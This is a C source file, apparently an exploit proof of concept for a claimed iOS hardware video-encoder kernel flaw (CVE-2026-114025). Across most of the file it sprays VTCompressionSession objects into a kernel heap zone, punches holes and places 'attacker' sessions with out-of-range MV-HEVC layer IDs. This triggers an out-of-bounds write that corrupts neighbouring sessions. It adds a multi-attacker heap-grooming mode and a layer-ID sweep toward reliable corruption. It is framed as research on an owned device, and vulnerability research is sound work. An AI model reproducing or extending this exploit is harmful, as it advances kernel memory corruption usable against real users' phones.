/*
 * ave_two_session.c — CVE-2026-114025 Two-Session Cascade Probe v3
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * Key insight: kalloc_type isolation means encoder session objects are ONLY
 * adjacent to other encoder sessions. We control both sides.
 *
 * Strategy:
 *   1. Spray VTCompressionSession objects (each creates ~3820B in kalloc.4096)
 *   2. Free some sessions to create holes
 *   3. Create attacker session in hole
 *   4. Attacker's OOB write (layer_id >= 189) corrupts adjacent victim session
 *   5. Trigger encode on victim — crash/error = corruption confirmed
 *
 * Write primitive: 8 bytes (stp w19, w20) at table_base + layer_id * 16
 * Cross-object at layer_id >= 189 from table 0x432:
 *   lid=189 → victim offset 0x002 (8 bytes: 0x002-0x009)
 *   lid=190 → victim offset 0x012 (corrupts data ptr at 0x010)
 *   lid=191 → victim offset 0x022
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
 *        -framework CoreFoundation -framework IOKit
 *        -o AVETwoSession ave_two_session.c -Wno-deprecated-declarations
 *
 * Bundle ID: com.research.avetwosession
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>

static FILE *g_log = NULL;

static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
}

#define MAX_SESSIONS 64

typedef struct {
    VTCompressionSessionRef session;
    int index;
    int alive;
} EncoderSlot;

static EncoderSlot g_slots[MAX_SESSIONS];
static int g_encode_results[MAX_SESSIONS];

static void encode_cb(void *ctx, void *src, OSStatus status,
                      VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    int *result = (int *)ctx;
    *result = (int)status;
}

static CVPixelBufferRef create_pixel_buffer(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    int fmt = kCVPixelFormatType_32BGRA;
    CVReturn ret = CVPixelBufferCreate(NULL, w, h, fmt, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x42, w * h * 4);
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static VTCompressionSessionRef create_hevc_session(int index, int width, int height) {
    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    g_encode_results[index] = -999;
    OSStatus st = VTCompressionSessionCreate(NULL, width, height,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        encode_cb, &g_encode_results[index], &session);
    CFRelease(enc_spec);

    if (st != noErr || !session) return NULL;

    VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel,
                         CFSTR("HEVC_Main_AutoLevel"));
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);

    return session;
}

static int configure_mvhevc(VTCompressionSessionRef session, int layer_id) {
    int base_layer = 0;
    CFNumberRef ids[2];
    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base_layer);
    ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
    VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);

    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base_layer);
    CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
    VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);

    CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);
    CFRelease(left); CFRelease(right);

    OSStatus st = VTCompressionSessionPrepareToEncodeFrames(session);
    return (int)st;
}

static int do_encode(VTCompressionSessionRef session, int index, int w, int h) {
    CVPixelBufferRef pb = create_pixel_buffer(w, h);
    if (!pb) return -1;

    CMTime pts = CMTimeMake(0, 30);
    CMTime dur = CMTimeMake(1, 30);
    OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
    if (st == noErr) {
        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
        usleep(300000);
    }
    CVPixelBufferRelease(pb);
    return (int)st;
}

/*
 * Phase 1: Determine max concurrent hardware encoder sessions
 */
static int phase_max_sessions(void) {
    rlog("\n========================================\n");
    rlog("PHASE 1: Max concurrent encoder sessions\n");
    rlog("========================================\n");

    int count = 0;
    for (int i = 0; i < MAX_SESSIONS; i++) {
        g_slots[i].session = create_hevc_session(i, 128, 128);
        g_slots[i].index = i;
        if (g_slots[i].session) {
            g_slots[i].alive = 1;
            count++;
        } else {
            g_slots[i].alive = 0;
            rlog("[MAX] Session %d: create failed (limit reached at %d)\n", i, count);
            break;
        }
    }
    rlog("[MAX] Created %d concurrent HW encoder sessions\n", count);
    rlog("[MAX] Each creates ~3820 byte encoder object in kalloc.4096\n");
    rlog("[MAX] Type-isolated zone: only encoder objects are adjacent\n\n");

    for (int i = 0; i < MAX_SESSIONS; i++) {
        if (g_slots[i].alive) {
            VTCompressionSessionInvalidate(g_slots[i].session);
            CFRelease(g_slots[i].session);
            g_slots[i].session = NULL;
            g_slots[i].alive = 0;
        }
    }
    return count;
}

/*
 * Phase 2: Two-session OOB test
 *
 * Create N sessions (spray), free alternating ones (holes),
 * create attacker session in hole, trigger OOB write,
 * test victim sessions for crashes.
 */
static void phase_two_session(int spray_count, int attacker_lid) {
    int victim_offset = 0x432 + attacker_lid * 16 - 4096;

    rlog("\n========================================\n");
    rlog("PHASE 2: Two-session cross-object test\n");
    rlog("  Spray: %d sessions\n", spray_count);
    rlog("  Attacker layer_id: %d\n", attacker_lid);
    rlog("  Victim offset: 0x%03x (8 bytes: 0x%03x-0x%03x)\n",
         victim_offset, victim_offset, victim_offset + 7);
    rlog("========================================\n\n");

    /* Step 1: Spray encoder sessions */
    rlog("[SPRAY] Creating %d encoder sessions...\n", spray_count);
    int created = 0;
    for (int i = 0; i < spray_count && i < MAX_SESSIONS; i++) {
        g_slots[i].session = create_hevc_session(i, 128, 128);
        g_slots[i].index = i;
        if (g_slots[i].session) {
            g_slots[i].alive = 1;
            created++;
        } else {
            g_slots[i].alive = 0;
        }
    }
    rlog("[SPRAY] Created %d / %d sessions\n", created, spray_count);
    if (created < 4) {
        rlog("[ERROR] Need at least 4 sessions for two-session test\n");
        goto cleanup;
    }
    usleep(100000);

    /* Step 2: Prepare all victim sessions (configure MV-HEVC with safe layer_id) */
    rlog("[PREP] Configuring all sessions with safe MV-HEVC (layer_id=1)...\n");
    int prepared = 0;
    for (int i = 0; i < spray_count && i < MAX_SESSIONS; i++) {
        if (!g_slots[i].alive) continue;
        int st = configure_mvhevc(g_slots[i].session, 1);
        if (st == 0) prepared++;
        else rlog("[PREP] Session %d: prepare failed (%d)\n", i, st);
    }
    rlog("[PREP] %d sessions ready\n", prepared);

    /* Step 3: Encode one frame on each victim to fully initialize them */
    rlog("[INIT] Running initial encode on all sessions...\n");
    int encoded = 0;
    for (int i = 0; i < spray_count && i < MAX_SESSIONS; i++) {
        if (!g_slots[i].alive) continue;
        int st = do_encode(g_slots[i].session, i, 128, 128);
        if (st == 0) encoded++;
        else rlog("[INIT] Session %d: encode failed (%d)\n", i, st);
    }
    rlog("[INIT] %d sessions encoded successfully\n\n", encoded);

    /* Step 4: Free middle sessions to create holes */
    rlog("[HOLES] Freeing alternating sessions (even indices)...\n");
    int freed = 0;
    for (int i = 2; i < spray_count - 2; i += 2) {
        if (g_slots[i].alive) {
            VTCompressionSessionInvalidate(g_slots[i].session);
            CFRelease(g_slots[i].session);
            g_slots[i].session = NULL;
            g_slots[i].alive = 0;
            freed++;
        }
    }
    rlog("[HOLES] Freed %d sessions\n", freed);
    usleep(100000);

    /* Step 5: Create attacker session in hole + configure with OOB layer_id */
    int attacker_idx = spray_count / 2;
    if (attacker_idx % 2 != 0) attacker_idx--;
    rlog("[ATTACK] Creating attacker session at slot %d with layer_id=%d\n",
         attacker_idx, attacker_lid);

    g_slots[attacker_idx].session = create_hevc_session(attacker_idx, 128, 128);
    if (!g_slots[attacker_idx].session) {
        rlog("[ERROR] Failed to create attacker session\n");
        goto cleanup;
    }
    g_slots[attacker_idx].alive = 1;

    int ast = configure_mvhevc(g_slots[attacker_idx].session, attacker_lid);
    rlog("[ATTACK] Attacker prepare: %d\n", ast);

    /* Step 6: Trigger the OOB write */
    rlog("[ATTACK] Triggering OOB encode (THIS writes past the allocation)...\n");
    int enc_st = do_encode(g_slots[attacker_idx].session, attacker_idx, 128, 128);
    rlog("[ATTACK] Encode result: %d (0=success)\n\n", enc_st);

    if (enc_st != 0) {
        rlog("[RESULT] Attacker encode failed with %d\n", enc_st);
        rlog("[RESULT] The kernel may have rejected the OOB access\n");
        goto cleanup;
    }

    /* Step 7: Test victim sessions for corruption */
    rlog("[CHECK] Testing victim sessions for corruption...\n");
    int victims_ok = 0, victims_crashed = 0, victims_error = 0;

    for (int i = 0; i < spray_count && i < MAX_SESSIONS; i++) {
        if (!g_slots[i].alive) continue;
        if (i == attacker_idx) continue;

        int adj = (i == attacker_idx - 1 || i == attacker_idx + 1);
        const char *tag = adj ? "ADJACENT" : "distant";

        g_encode_results[i] = -999;
        int st = do_encode(g_slots[i].session, i, 128, 128);

        if (st == 0 && g_encode_results[i] == 0) {
            victims_ok++;
            if (adj) rlog("[CHECK] Session %d (%s): OK (no visible corruption)\n", i, tag);
        } else {
            if (adj) {
                rlog("[CHECK] Session %d (%s): ERROR st=%d cb=%d  *** POSSIBLE CORRUPTION ***\n",
                     i, tag, st, g_encode_results[i]);
                victims_crashed++;
            } else {
                victims_error++;
            }
        }
    }

    rlog("\n[RESULT] Victims OK: %d, Crashed/Error(adjacent): %d, Error(distant): %d\n",
         victims_ok, victims_crashed, victims_error);

    if (victims_crashed > 0) {
        rlog("\n!!! ADJACENT SESSION CORRUPTION DETECTED !!!\n");
        rlog("!!! Cross-object OOB write confirmed at layer_id=%d !!!\n", attacker_lid);
        rlog("!!! Victim offset 0x%03x corrupted !!!\n", victim_offset);
    } else if (enc_st == 0) {
        rlog("\n[INFO] OOB write succeeded but no visible victim corruption.\n");
        rlog("[INFO] Possible reasons:\n");
        rlog("[INFO]   - Corrupted fields not exercised by basic encode\n");
        rlog("[INFO]   - Heap layout: attacker not adjacent to any victim\n");
        rlog("[INFO]   - Corrupted data happened to be valid\n");
        rlog("[INFO] Next: try different layer_ids, more spray, or crash oracle\n");
    }

cleanup:
    rlog("\n[CLEANUP] Releasing all sessions...\n");
    for (int i = 0; i < MAX_SESSIONS; i++) {
        if (g_slots[i].alive && g_slots[i].session) {
            VTCompressionSessionInvalidate(g_slots[i].session);
            CFRelease(g_slots[i].session);
            g_slots[i].session = NULL;
            g_slots[i].alive = 0;
        }
    }
}

/*
 * Phase 3: Shotgun strategy — multiple attackers for reliable adjacency
 *
 * On 16KB pages, kalloc.4096 holds 4 objects per page.
 * Spray 48 sessions, free every 4th (12 holes), fill each hole with an
 * attacker. With 12 attackers spread across the zone, at least one
 * should be adjacent to a victim.
 */
static void phase_shotgun(int attacker_lid) {
    int victim_offset = 0x432 + attacker_lid * 16 - 4096;

    rlog("\n========================================\n");
    rlog("PHASE 3-SHOTGUN: Multi-attacker spread\n");
    rlog("  Strategy: 48 spray, 12 attackers, all test\n");
    rlog("  Attacker layer_id: %d → victim offset 0x%03x\n",
         attacker_lid, victim_offset);
    rlog("========================================\n\n");

    int spray_n = 48;
    if (spray_n > MAX_SESSIONS) spray_n = MAX_SESSIONS;

    /* Step 1: Spray */
    rlog("[SHOTGUN] Spraying %d sessions...\n", spray_n);
    int created = 0;
    for (int i = 0; i < spray_n; i++) {
        g_slots[i].session = create_hevc_session(i, 128, 128);
        g_slots[i].index = i;
        if (g_slots[i].session) {
            g_slots[i].alive = 1;
            created++;
        } else {
            g_slots[i].alive = 0;
            rlog("[SHOTGUN] HW limit at %d sessions\n", created);
            spray_n = i;
            break;
        }
    }
    rlog("[SHOTGUN] Created %d sessions\n", created);
    if (created < 8) { rlog("[SHOTGUN] Too few sessions\n"); goto sg_cleanup; }

    /* Step 2: Initialize all with safe encode */
    rlog("[SHOTGUN] Initializing all sessions (safe encode)...\n");
    for (int i = 0; i < spray_n; i++) {
        if (!g_slots[i].alive) continue;
        configure_mvhevc(g_slots[i].session, 1);
        do_encode(g_slots[i].session, i, 128, 128);
    }
    usleep(100000);

    /* Step 3: Free every 4th session (creates holes on each page) */
    rlog("[SHOTGUN] Freeing every 4th session...\n");
    int freed = 0;
    int attacker_slots[16];
    int n_attackers = 0;
    for (int i = 3; i < spray_n && n_attackers < 16; i += 4) {
        if (g_slots[i].alive) {
            VTCompressionSessionInvalidate(g_slots[i].session);
            CFRelease(g_slots[i].session);
            g_slots[i].session = NULL;
            g_slots[i].alive = 0;
            attacker_slots[n_attackers++] = i;
            freed++;
        }
    }
    rlog("[SHOTGUN] Freed %d sessions, %d attacker slots\n", freed, n_attackers);
    usleep(100000);

    /* Step 4: Fill holes with attacker sessions + OOB layer_id */
    rlog("[SHOTGUN] Creating %d attacker sessions (layer_id=%d)...\n",
         n_attackers, attacker_lid);
    int attackers_created = 0;
    for (int a = 0; a < n_attackers; a++) {
        int idx = attacker_slots[a];
        g_slots[idx].session = create_hevc_session(idx, 128, 128);
        if (g_slots[idx].session) {
            g_slots[idx].alive = 1;
            configure_mvhevc(g_slots[idx].session, attacker_lid);
            attackers_created++;
        }
    }
    rlog("[SHOTGUN] Created %d attacker sessions\n", attackers_created);

    /* Step 5: Trigger OOB write from every attacker */
    rlog("[SHOTGUN] Triggering OOB writes from all attackers...\n");
    int oob_ok = 0;
    for (int a = 0; a < n_attackers; a++) {
        int idx = attacker_slots[a];
        if (!g_slots[idx].alive) continue;
        int st = do_encode(g_slots[idx].session, idx, 128, 128);
        if (st == 0) oob_ok++;
        else rlog("[SHOTGUN] Attacker %d encode failed: %d\n", idx, st);
    }
    rlog("[SHOTGUN] %d / %d OOB writes succeeded\n\n", oob_ok, attackers_created);

    /* Step 6: Test ALL remaining victim sessions */
    rlog("[SHOTGUN] Testing all victim sessions for corruption...\n");
    int ok = 0, corrupted = 0, error = 0;
    for (int i = 0; i < spray_n; i++) {
        if (!g_slots[i].alive) continue;

        int is_attacker = 0;
        for (int a = 0; a < n_attackers; a++)
            if (attacker_slots[a] == i) { is_attacker = 1; break; }
        if (is_attacker) continue;

        int adj = 0;
        for (int a = 0; a < n_attackers; a++) {
            if (i == attacker_slots[a] - 1 || i == attacker_slots[a] + 1)
                { adj = 1; break; }
        }

        g_encode_results[i] = -999;
        int st = do_encode(g_slots[i].session, i, 128, 128);

        if (st == 0 && g_encode_results[i] == 0) {
            ok++;
        } else {
            rlog("[SHOTGUN] Session %d (%s): ERROR st=%d cb=%d *** CORRUPTION ***\n",
                 i, adj ? "ADJACENT" : "distant", st, g_encode_results[i]);
            corrupted++;
        }
    }

    rlog("\n[SHOTGUN] RESULTS: OK=%d, Corrupted=%d, Error=%d\n", ok, corrupted, error);
    if (corrupted > 0) {
        rlog("\n!!! SHOTGUN: CROSS-OBJECT CORRUPTION CONFIRMED !!!\n");
        rlog("!!! %d victim sessions show altered behavior !!!\n", corrupted);
    } else if (oob_ok > 0) {
        rlog("\n[SHOTGUN] OOB writes succeeded but no visible corruption.\n");
        rlog("[SHOTGUN] Corrupted fields may not affect basic encode path.\n");
        rlog("[SHOTGUN] Next: try crash oracle or different victim operations.\n");
    }

sg_cleanup:
    for (int i = 0; i < MAX_SESSIONS; i++) {
        if (g_slots[i].alive && g_slots[i].session) {
            VTCompressionSessionInvalidate(g_slots[i].session);
            CFRelease(g_slots[i].session);
            g_slots[i].session = NULL;
            g_slots[i].alive = 0;
        }
    }
}

/*
 * Phase 4: Sweep layer_ids to find which ones cause visible corruption
 */
static void phase_sweep(int spray_count) {
    rlog("\n========================================\n");
    rlog("PHASE 3: Layer ID sweep (189-200)\n");
    rlog("========================================\n");

    int test_lids[] = {189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200};
    for (int i = 0; i < 12; i++) {
        rlog("\n>>> Sweep: layer_id=%d <<<\n", test_lids[i]);
        phase_two_session(spray_count, test_lids[i]);
        usleep(500000);
    }
}

int main(int argc, char *argv[]) {
    char logpath[512];
    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_two_session.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp");
    g_log = fopen(logpath, "w");

    rlog("=== CVE-2026-114025 Two-Session Cascade Probe v3 ===\n");
    rlog("Device: iPhone Duo (A20 Pro), iOS 27.1\n");
    rlog("Strategy: type-isolated zone, encoder-vs-encoder corruption\n");
    rlog("Write: 8 bytes (stp w19,w20) at table_base + layer_id*16\n");
    rlog("Cross-object: layer_id >= 189 from table 0x432\n");
    rlog("Time: %s\n", __TIMESTAMP__);
    rlog("PID: %d\n\n", getpid());

    const char *mode = (argc > 1) ? argv[1] : "max";

    if (strcmp(mode, "max") == 0) {
        phase_max_sessions();
    } else if (strcmp(mode, "test") == 0) {
        int sc = phase_max_sessions();
        if (sc < 4) sc = 8;
        if (sc > 32) sc = 32;
        phase_two_session(sc, 190);
    } else if (strcmp(mode, "shotgun") == 0) {
        phase_max_sessions();
        phase_shotgun(190);
    } else if (strcmp(mode, "sweep") == 0) {
        int sc = phase_max_sessions();
        if (sc < 4) sc = 8;
        if (sc > 24) sc = 24;
        phase_sweep(sc);
    } else if (strncmp(mode, "lid_", 4) == 0) {
        int lid = atoi(mode + 4);
        if (lid < 189) lid = 189;
        int sc = phase_max_sessions();
        if (sc < 4) sc = 8;
        if (sc > 32) sc = 32;
        phase_two_session(sc, lid);
    } else {
        rlog("Usage: AVETwoSession <mode>\n");
        rlog("  max      — determine max concurrent sessions\n");
        rlog("  test     — two-session test with layer_id=190\n");
        rlog("  shotgun  — multi-attacker spread for reliable adjacency\n");
        rlog("  sweep    — sweep layer_ids 189-200\n");
        rlog("  lid_N    — two-session test with layer_id=N\n");
    }

    rlog("\n=== Probe complete ===\n");
    if (g_log) fclose(g_log);
    return 0;
}
